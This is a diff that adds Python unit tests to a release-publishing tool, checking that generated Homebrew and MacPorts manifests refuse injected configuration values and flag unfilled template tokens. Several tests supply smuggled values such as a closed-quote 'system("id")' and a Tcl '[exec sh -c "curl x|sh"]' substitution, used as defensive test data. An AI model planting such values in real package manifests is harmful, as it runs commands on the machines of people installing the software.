@@ -49,6 +49,7 @@ from continuum.release.publishers.validation import GeneratedFile, audit
 VERSION = "1.4.0"
 TAG = f"v{VERSION}"
 BASE = f"https://github.com/acme/widget/releases/download/{TAG}"
+DIGEST = hashlib.sha256(b"payload").hexdigest()
 
 
 def release() -> ReleaseIdentity:
@@ -570,6 +571,252 @@ class IsolationTests(unittest.TestCase):
                     self.assertNotIn("release.run", name)
                     self.assertNotIn("release.adapters", name)
                     self.assertNotIn("release.config", name)
+
+
+class ManifestInjectionTests(unittest.TestCase):
+    """A configuration value is written into a generated manifest as *source*.
+
+    Every individual field is validated, and every individual field is a perfectly
+    legal string: a description, a licence, a homepage, a path. Nothing in the
+    configuration is wrong. What is wrong is that the manifest is Ruby and Tcl, so
+    a double quote closes the literal and `[...]` is command substitution -- and
+    what follows is source the package manager runs on the machine installing the
+    software.
+
+    That is not a malformed formula that a maintainer notices and fixes. The
+    generated file is valid, Homebrew evaluates the class body, and the command
+    runs. So the boundary is checked where the value enters, and these tests are
+    written against the generated output rather than against the validator, because
+    the output is the thing that gets evaluated.
+    """
+
+    def _formula(self, **formula):
+        return homebrew_settings(
+            formula={
+                "desc": "A widget",
+                "homepage": "https://github.com/acme/widget",
+                "license": "MIT",
+                "install_paths": ["widget"],
+                **formula,
+            }
+        )
+
+    def _portfile(self, **portfile):
+        return macports_settings(
+            portfile={"name": "widget", **portfile}
+        )
+
+    def _generated_formula(self, settings) -> str:
+        item = artifact("widget-1.4.0.tar.gz")
+        return homebrew.plan(
+            PublishRequest(manifest=manifest(item), settings=settings),
+            fetcher=fetcher_for(item),
+        )[0].content
+
+    def _refused(self, make):
+        with self.assertRaises(PublisherError) as caught:
+            make()
+        return str(caught.exception)
+
+    # -- homebrew: quoted Ruby literals -------------------------------------
+
+    def test_a_description_cannot_close_its_own_string(self):
+        message = self._refused(
+            lambda: self._formula(desc='A widget"; system("id"); desc "')
+        )
+        self.assertIn("desc", message)
+        self.assertIn("evaluated as manifest source", message)
+
+    def test_a_licence_cannot_close_its_own_string(self):
+        self.assertIn("license", self._refused(
+            lambda: self._formula(license='MIT"; system("id"); license "')
+        ))
+
+    def test_a_homepage_cannot_close_its_own_string(self):
+        # A URL is the least suspicious field in the file and the same failure.
+        self.assertIn("homepage", self._refused(
+            lambda: self._formula(homepage='https://x/y"; system("id"); url "')
+        ))
+
+    def test_a_trailing_backslash_cannot_swallow_the_closing_quote(self):
+        # The generated line is `version "<value>"`. A value ending in a backslash
+        # escapes the quote the emitter wrote, so the *next* line becomes a
+        # continuation of this one.
+        self.assertIn("desc", self._refused(lambda: self._formula(desc="A widget\\")))
+
+    def test_an_install_path_is_bare_source_too(self):
+        # `bin.install widget` is not quoted, so a semicolon there is a statement
+        # boundary rather than a character in a word.
+        message = self._refused(lambda: self._formula(install_paths=['widget; system("id")']))
+        self.assertIn("install_paths", message)
+
+    def test_a_service_path_cannot_close_its_own_string(self):
+        self.assertIn("working_dir", self._refused(lambda: self._formula(
+            service={"label": "Widget", "working_dir": '~"; system("id"); x "'})))
+
+    # -- macports: bare Tcl words -------------------------------------------
+
+    def test_a_description_cannot_be_command_substitution(self):
+        message = self._refused(
+            lambda: self._portfile(description='A widget [exec sh -c "curl x|sh"]')
+        )
+        self.assertIn("description", message)
+
+    def test_a_long_description_cannot_expand_a_variable(self):
+        self.assertIn("long_description", self._refused(
+            lambda: self._portfile(long_description="A widget ${HOME}/x")
+        ))
+
+    def test_a_dependency_cannot_close_the_list_with_a_statement(self):
+        self.assertIn("depends_lib", self._refused(
+            lambda: self._portfile(depends_lib=["libx:foo", 'liby:bar; system("id")'])
+        ))
+
+    def test_maintainers_still_accept_the_documented_brace_group(self):
+        # The refusal above cannot be a blanket one: `{example.com:user @user}` is
+        # how MacPorts spells a maintainer, so a check that forbade braces would
+        # forbid correct configuration and get disabled.
+        settings = self._portfile(maintainers="{example.com:user @user} openmaintainer")
+        self.assertEqual(
+            settings.portfile.maintainers, "{example.com:user @user} openmaintainer"
+        )
+
+    def test_maintainers_still_refuses_substitution_inside_the_group(self):
+        message = self._refused(
+            lambda: self._portfile(maintainers="{a@b.com A} [exec id]")
+        )
+        self.assertIn("maintainers", message)
+
+    def test_an_unbalanced_brace_group_is_refused(self):
+        # Braces that do not pair are a Tcl syntax error, and a Portfile that does
+        # not parse fails the build rather than the release that wrote it.
+        self.assertIn("balance", self._refused(
+            lambda: self._portfile(maintainers="{example.com:user")
+        ))
+
+    # -- what still has to work ---------------------------------------------
+
+    def test_an_ordinary_configuration_still_generates_a_parsable_formula(self):
+        # The bound runs both ways. A check that refuses ordinary punctuation is a
+        # check that gets turned off, so the realistic configuration is asserted
+        # as positively as the attack is.
+        content = self._generated_formula(
+            self._formula(
+                desc="A fast widget (with punctuation, dashes - and 'quotes')",
+                license="Apache-2.0 OR MIT",
+                install_paths=["bin/widget", "share/man/man1/widget.1"],
+            )
+        )
+        self.assertIn('desc "A fast widget (with punctuation, dashes - and ', content)
+        self.assertIn('bin.install "bin/widget", "share/man/man1/widget.1"', content)
+
+    def test_an_apostrophe_in_a_description_is_still_allowed(self):
+        # Only the double quote ends a Ruby string. Refusing `'` would refuse the
+        # single most common character in prose for no security benefit.
+        content = self._generated_formula(self._formula(desc="A widget's worth of speed"))
+        self.assertIn("widget's worth", content)
+
+    def test_the_regex_a_pattern_may_use_is_not_a_manifest_value(self):
+        # required_text and forbidden_text are never emitted, so a pattern there
+        # may contain the characters the manifest boundary forbids. Checking them
+        # would refuse every useful validation pattern.
+        settings = self._formula()
+        self.assertEqual(settings.formula.required_text, ())
+
+
+class TemplateTokenTests(unittest.TestCase):
+    """An unfilled token installs, and installs the *previous* release quietly.
+
+    A generated manifest that still reads `version "__VERSION__"` is syntactically
+    fine, passes every parser, and resolves to whatever was published before. The
+    check is what turns that into a failed job instead of a broken install, so it is
+    tested on both halves: a token in live text must be caught, and a token in a
+    comment must not -- a scanner that reports documented tokens is a scanner whose
+    output gets ignored, which costs the check the only signal it exists to give.
+
+    Every file here is otherwise valid, so a failure means the token check fired
+    and not that something else happened to be wrong too.
+    """
+
+    def _report(self, content: str):
+        item = artifact("widget-1.4.0.tar.gz")
+        document = GeneratedFile(
+            path="Formula/widget.rb",
+            content=content,
+            surface="formula",
+            selected=(item,),
+        )
+        return audit(document, manifest(item))
+
+    def _failed_checks(self, content: str):
+        return [check.name for check in self._report(content).checks if check.status != "passed"]
+
+    def test_an_unfilled_token_is_refused(self):
+        report_content = (
+            f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
+            f'sha256 "{DIGEST}"\n'
+            'version "__VERSION__"\n'
+        )
+        report = self._report(report_content)
+        self.assertFalse(report.ok)
+        self.assertIn("template-tokens-filled", self._failed_checks(report_content))
+
+    def test_a_documented_token_is_not_a_failure(self):
+        self.assertEqual(
+            self._failed_checks(
+                "# The generator fills __SHA256__ and __VERSION__ below.\n"
+                f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
+                f'sha256 "{DIGEST}"\n'
+                f'version "{VERSION}"  # was __VERSION__\n'
+            ),
+            [],
+        )
+
+    def test_a_token_in_live_text_after_a_url_is_still_caught(self):
+        # `//` and `--` are path and flag punctuation, not comment introducers
+        # mid-line. Treating them as comments deletes live text, and deleting live
+        # text here means shipping an unfilled token.
+        self.assertEqual(
+            self._failed_checks(
+                f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
+                '  url "https://example.invalid/__SHA256__"\n'
+                f'sha256 "{DIGEST}"\n'
+                f'version "{VERSION}"\n'
+            ),
+            ["template-tokens-filled"],
+        )
+
+    def test_a_flag_that_merely_starts_with_a_comment_marker_is_live_text(self):
+        self.assertEqual(
+            self._failed_checks(
+                f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
+                "  opt --dry-run\n"
+                f'sha256 "{DIGEST}"\n'
+                f'version "{VERSION}"\n'
+            ),
+            [],
+        )
+
+    def test_each_comment_syntax_is_understood(self):
+        from continuum.release.publishers.validation import unfilled_template_tokens
+
+        for content in (
+            "# __VERSION__",
+            "// __VERSION__",
+            "-- __VERSION__",
+            "; __VERSION__",
+            'version "1.0.0" # __VERSION__',
+            'url "https://x/y"  // __VERSION__',
+            'port "x"  -- __VERSION__',
+        ):
+            with self.subTest(content=content):
+                self.assertEqual(unfilled_template_tokens(content), [])
+
+    def test_an_absent_token_is_not_reported_as_one(self):
+        from continuum.release.publishers.validation import unfilled_template_tokens
+
+        self.assertEqual(unfilled_template_tokens(""), [])
+        self.assertEqual(unfilled_template_tokens('sha256 "abc"\nversion "1.0.0"'), [])
 
 
 class ValidationAuditTests(unittest.TestCase):
